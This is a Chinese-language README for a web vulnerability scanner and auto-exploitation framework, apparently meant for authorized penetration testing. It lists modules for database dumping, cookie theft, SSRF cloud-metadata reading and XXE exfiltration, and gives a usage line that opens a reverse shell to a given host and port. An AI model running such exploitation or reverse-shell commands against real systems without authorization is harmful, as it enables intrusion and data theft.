# WebVulnScanner v7.0

> **全功能 Web 漏洞扫描与自动利用框架**
> Author: 火柴 | GitHub: [huocai250](https://github.com/huocai250)
> ⚠️ **仅供已获书面授权的渗透测试使用！**

---

## v7.0 新增功能

| 功能 | 说明 |
|------|------|
| 🌐 Web UI | Flask 实时界面，SSE 进度推送，在线查看结果 |
| 🔍 指纹识别 | 100+ 规则：CMS/框架/服务器/CDN/WAF/数据库 |
| 🔌 插件系统 | plugins/ 目录热加载，自定义扫描模块 |
| ⚡ 异步引擎 | asyncio 并发多目标，互不阻塞 |
| ⚡ SSRF 利用 | 云元数据读取/内网探测/文件读取 |
| ⚡ XXE 利用 | 数据外带/PHP wrapper/SSRF via XXE |

---

## 安装

```bash
pip install -r requirements.txt          # 基础（命令行）
pip install -r requirements.txt flask    # 含 Web UI
```

---

## 使用方法

### 命令行扫描
```bash
# 基础扫描
python main.py https://example.com

# 开启漏洞自动利用
python main.py https://example.com --exploit

# 批量目标 + 异步并发
python main.py -f targets.txt --threads 20

# 快速模式
python main.py https://example.com --fast

# 带代理 + 速率限制
python main.py https://example.com --proxy http://127.0.0.1:8080 --rate-limit 0.5

# 只运行指定模块
python main.py https://example.com --only sqli,xss,fingerprint

# 命令注入 + 反弹Shell
python main.py https://example.com --exploit --exploit-types cmdi \
  --reverse-host 192.168.1.100 --reverse-port 4444
```

### 启动 Web UI
```bash
pip install flask
python main.py --webui
# 浏览器访问 http://127.0.0.1:5000
```

### 自定义插件
在 `plugins/` 目录新建 `.py` 文件：
```python
from core.scanner import BaseScanner

PLUGIN_META = {
    "name":    "我的扫描器",
    "key":     "my_scan",
    "author":  "你的名字",
    "version": "1.0",
}

class MyScanner(BaseScanner):
    def run(self):
        _before = self.result.total()
        # 你的检测逻辑
        self._log_module_done(PLUGIN_META["name"], _before)
```

---

## 模块列表（27个内置 + 插件）

| # | 模块 | 功能 | 利用 |
|---|------|------|------|
| 1  | 爬虫 | 发现参数URL和表单 | - |
| 2  | 信息收集 | Server/WAF/DNS/robots | - |
| 3  | **指纹识别** | 100+规则识别框架/CMS | - |
| 4  | CMS专项 | WP/Joomla/ThinkPHP RCE/Shiro | - |
| 5  | HTTP安全头 | HSTS/CSP/Cookie等 | - |
| 6  | SSL/TLS | 证书/旧协议/弱密码套件 | - |
| 7  | 敏感信息 | 密钥/.env/.git等 | - |
| 8  | CORS | 配置错误 | - |
| 9  | CSRF | 表单Token | - |
| 10 | Clickjacking | iframe/目录列表 | - |
| 11 | HTTP方法 | TRACE/PUT/DELETE | - |
| 12 | 开放重定向 | 多种绕过 | - |
| 13 | JWT安全 | None算法/弱密钥 | - |
| 14 | 注入检测 | Log4Shell/CRLF/Host Header | - |
| 15 | API安全 | 未授权/GraphQL/IDOR | - |
| 16 | **SQL注入** | 报错/布尔/时延 | ✅ dump数据库 |
| 17 | **XSS** | 反射/SSTI | ✅ PoC+Cookie窃取 |
| 18 | **LFI/命令注入** | 文件包含/RCE | ✅ 读文件/反弹Shell |
| 19 | 路径穿越 | 40+绕过 | - |
| 20 | **XXE** | XML外部实体 | ✅ 文件读取/OOB |
| 21 | **SSRF** | 内网探测 | ✅ 云元数据/内网 |
| 22 | 文件上传 | 扩展名绕过 | - |
| 23 | 弱口令 | 默认凭据 | - |
| 24 | 子域名枚举 | 80+字典 | - |
| 25 | 端口扫描 | 30+高危端口 | - |
| 26 | 目录枚举 | 80+路径+软404过滤 | - |
| +N | **插件** | 用户自定义 | 自定义 |

---

## 项目结构

```
webscan7/
├── main.py                  # 主入口（命令行 + Web UI 启动）
├── requirements.txt
├── scanner.cfg              # 配置文件
├── README.md
├── core/
│   ├── logger.py            # 统一日志
│   ├── config.py            # 配置管理
│   ├── result.py            # 结果收集
│   ├── scanner.py           # 基础扫描器
│   ├── rate_limiter.py      # 速率限制
│   ├── plugin_manager.py    # 插件系统 [v7新增]
│   └── async_scanner.py     # 异步引擎 [v7新增]
├── modules/
│   ├── fingerprint.py       # 指纹识别 [v7新增]
│   ├── ...（25个扫描模块）
│   └── exploit/
│       ├── sqli_exploit.py
│       ├── cmdi_exploit.py
│       ├── xss_exploit.py
│       ├── lfi_exploit.py
│       ├── ssrf_exploit.py  # [v7新增]
│       └── xxe_exploit.py   # [v7新增]
├── web/
│   ├── app.py               # Flask Web UI [v7新增]
│   └── templates/
│       └── index.html       # 实时界面
├── plugins/                 # 用户自定义插件目录
│   └── example_plugin.py    # 示例插件
└── utils/
    ├── http.py
    └── report.py            # JSON/HTML/CSV
```

---

## 法律声明

本工具仅供安全研究人员在**已获得书面授权**的情况下使用。
未经授权扫描他人系统可能违反相关法律，作者不承担任何法律责任。

**Author: 火柴 | GitHub: https://github.com/huocai250**
